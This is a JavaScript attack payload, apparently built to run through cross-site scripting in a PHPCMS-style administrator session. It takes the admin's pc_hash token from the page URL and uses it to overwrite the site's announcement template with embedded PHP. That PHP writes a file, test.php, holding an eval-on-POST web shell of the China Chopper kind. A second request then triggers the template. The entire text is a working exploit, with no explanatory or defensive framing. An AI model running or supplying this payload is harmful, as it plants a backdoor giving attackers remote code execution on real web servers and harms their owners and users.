if (top.window.location.href.indexOf("pc_hash=") > 0) {
    var hash = top.window.location.href.substr(top.window.location.href.indexOf("pc_hash=") + 8, 6);
}
var pkav = {
    ajax: function() {
        var xmlHttp;
        try {
            xmlHttp = new XMLHttpRequest();
        } catch (e) {
            try {
                xmlHttp = new ActiveXObject("Msxml2.XMLHTTP");
            } catch (e) {
                try {
                    xmlHttp = new ActiveXObject("Microsoft.XMLHTTP");
                } catch (e) {
                    return false;
                }
            }
        }
        return xmlHttp;
    },
    req: function(url, data, method, callback) {
        method = (method || "").toUpperCase();
        method = method || "GET";
        data = data || "";
        if (url) {
            var a = this.ajax();
            a.open(method, url, true);
            if (method == "POST") {
                a.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
            }
            a.onreadystatechange = function() {
                if (a.readyState == 4 && a.status == 200) {
                    if (callback) {
                        callback(a.responseText);
                    }
                }
            };
            if ((typeof data) == "object") {
                var arr = [];
                for (var i in data) {
                    arr.push(i + "=" + encodeURIComponent(data[i]));
                }
                a.send(arr.join("&"));
            } else {
                a.send(data || null);
            }
        }
    },
    get: function(url, callback) {
        this.req(url, "", "GET", callback);
    },
    post: function(url, data, callback) {
        this.req(url, data, "POST", callback);
    }
};
if (!window.__x) {
    pkav.post("index.php?m=template&c=file&a=edit_file&style=default&dir=announce&file=show.html", "code=%7Btemplate+%27content%27%2C+%27header%27%7D%0D%0A%3C%21--main--%3E%0D%0A%3Cdiv+class%3D%22main%22%3E%0D%0A%09%3Cdiv+class%3D%22col-left%22%3E%0D%0A++++%09%3Cdiv+class%3D%22crumbs%22%3E%3Ca+href%3D%22%7BAPP_PATH%7D%22%3E%CA%D7%D2%B3%3C%2Fa%3E%3Cspan%3E+%3E+%3C%2Fspan%3E%B9%AB%B8%E6%3C%2Fdiv%3E%0D%0A++++++++%3Cdiv+id%3D%22Article%22%3E%0D%0A++++++++%09%3Ch1%3E%7B%24title%7D%3Cbr+%2F%3E%0D%0A%3Cspan%3E%3C%2Fspan%3E%3C%2Fh1%3E%0D%0A%09%09%09%3Cdiv+class%3D%22content%22%3E%0D%0A%09%09%09++%7B%24content%7D%0D%0A%09%09%09%3C%2Fdiv%3E%0D%0A++++++%3C%2Fdiv%3E%0D%0A++%3C%2Fdiv%3E%0D%0A++++%3Cdiv+class%3D%22col-auto%22%3E%0D%0A++++++++%3Cdiv+class%3D%22box+pd_b0%22%3E%0D%0A%09%09%7Bpc%3Acomment+action%3D%22bang%22+cache%3D%223600%22%7D%0D%0A++++++++++++%3Cul+class%3D%22itemli%22%3E%0D%0A%09%09%09%7Bloop+%24data+%24r%7D%0D%0A++++++++++++++++%3Cli%3E%3Ca+href%3D%22%7B%24r%5Burl%5D%7D%22+target%3D%22_blank%22%3E%7Bstr_cut%28%24r%5Btitle%5D%2C+26%29%7D%3C%2Fa%3E%3C%2Fli%3E%0D%0A++++++++++++%7B%2Floop%7D%0D%0A++++++++++++%3C%2Ful%3E%0D%0A%09%09%7B%2Fpc%7D%0D%0A++++++++%3C%2Fdiv%3E%0D%0A++++%3C%2Fdiv%3E%0D%0A%3C%2Fdiv%3E%0D%0A%7Btemplate+%27content%27%2C+%27footer%27%7D%0D%0A%3Cscript+language%3Dphp%3E%24fp+%3D+%40fopen%28%22test.php%22%2C+%27a%27%29%3B%0D%0A%40fwrite%28%24fp%2C+%27%3C%27.%27%3Fphp%27.%22%5Cr%5Cn%5Cr%5Cn%22.%27%40eval%28%24_POST%5B%22chopper%22%5D%29%27.%22%5Cr%5Cn%5Cr%5Cn%3F%22.%22%3E%5Cr%5Cn%22%29%3B%0D%0A%40fclose%28%24fp%29%3B%3C%2Fscript%3E&dosubmit=%CC%E1%BD%BB&pc_hash=" + hash, function(rs) {});
    pkav.get("index.php?m=template&c=file&a=visualization&style=default&dir=announce&file=show.html&pc_hash=" + hash, function(rs) {});
    window.__x = 1;
}